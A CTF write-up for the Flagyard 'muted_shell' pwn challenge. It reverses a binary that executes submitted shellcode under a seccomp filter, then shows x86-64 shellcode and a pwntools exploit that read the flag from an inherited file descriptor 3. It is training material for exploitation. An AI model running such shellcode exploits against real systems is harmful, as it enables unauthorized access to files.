---
title: Flagyard: muted_shell (pwn, easy)
date: 2025-08-22
toc: true
---

<img width="1479" height="376" alt="image" src="https://github.com/user-attachments/assets/558c779d-ccdc-4848-bc44-33c27992dbba" />

## muted_shell: the binary
Let's take a look at the binary:

```bash
$ file muted_shell | tr ',' '\n'
muted_shell: ELF 64-bit LSB pie executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 BuildID[sha1]=d3eb2c77f71982b5288585a740784397c71076ae
 for GNU/Linux 3.2.0
 not stripped
 
$ pwn checksec muted_shell
[*] '/home/kali/Desktop/ctfs/flagyard/muted_shell/muted_shell'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

$ ./muted_shell
Send your shellcode:
^C
 ```

 So we can see that we are dealing with a PIE enabled 64 bit binary with an executable stack. When we run it, the binary prompts us to send shellcode. Since we don’t have shellcode yet, the next step is reversing the binary.

 ## Reverse Engineering

When we take a look at the main function in Ghidra, we see this:

 ```c
bool main(void)

{
  code *__buf;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  open("./flag",0);
  __buf = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  if (__buf != (code *)0xffffffffffffffff) {
    puts("Send your shellcode:");
    read(0,__buf,0x100);
    install_seccomp();
    (*__buf)();
  }
  else {
    perror("mmap");
  }
  return __buf == (code *)0xffffffffffffffff;
}
 ```

 `main()` function opens the flag file in read mode. Then it allocates memory with mmap() and stores shellcode there. It reads up to 0x100 bytes from stdin into the buffer. Then, seccomp is installed and our shellcode is executed. 

### can u read something without opening it?
 As, we know that `main()` function opens flag file in read mode and does not store the file descriptor returned by `open()`. Then how would we read the flag? 
 Hint suggests something about reading something without opening it. So, I researched how `open()` works. The file descriptor is not stored? No worries. Since `stdin = 0`, `stdout = 1`, `stderr = 2` are already taken, the kernel assigns the next free file descriptor, which is 3.
 So, we have to read the flag from the file descriptor 3.

### seccomp - wtf? 
Seccomp (Secure Computing Mode) is a Linux kernel feature that restricts the system calls a process can make. This prevents typical exploits like spawning a shell with `system("/bin/sh")`.

We can use `seccomp-tools` to see which syscalls are allowed by seccomp. If you don't have `seccomp-tools` installed you can do so by running following command:
```bash
$ gem install seccomp-tools
```
Dumping allowed syscalls for our binary:
```bash
$ seccomp-tools dump ./muted_shell
Send your shellcode:

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0003
 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0003: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
```

As we can see that only read, write & exit syscalls are allowed. 

## Crafting the shellcode

Since the file descriptor for the flag is 3, we can read it and write its content to stdout (1):

```asm
/* read(3, rsp, 0x100) */
xor rdi, rdi
mov dil, 3
mov rsi, rsp
mov rdx, 0x100
mov eax, 0
syscall

/* write(1, rsp, rax) */
mov edi, 1
mov rdx, rax
mov eax, 1
syscall

/* exit(0) */
xor edi, edi
mov eax, 60
syscall
```

## Exploit

We can use pwntools to assemble and send our shellcode:

```python3
from pwn import *

context.arch = "amd64"
asm_code = """
    /* read(3, rsp, 0x100) */
    xor rdi, rdi
    mov dil, 3
    mov rsi, rsp
    mov rdx, 0x100
    mov eax, 0
    syscall

    /* write(1, rsp, rax) */
    mov edi, 1
    mov rdx, rax
    mov eax, 1
    syscall

    /* exit(0) */
    xor edi, edi
    mov eax, 60
    syscall
"""

shellcode = asm(asm_code)

p = process("muted_shell")
p.sendline(shellcode)
p.interactive()
```

When we run it:

```bash
$ python3 exploit.py
[!] Could not find executable 'muted_shell' in$PATH, using './muted_shell' instead
[+] Starting local process './muted_shell': pid 1028017
[*] Switching to interactive mode
[*] Process './muted_shell' stopped with exit code 0 (pid 1028017)
Send your shellcode:
FlagY{test_flag}
[*] Got EOF while reading in interactive
$
[*] Got EOF while sending in interactive
```

To exploit a remote instance, replace `process("./muted_shell")` with:
```python
p = remote("IP_ADDRESS", PORT)
```
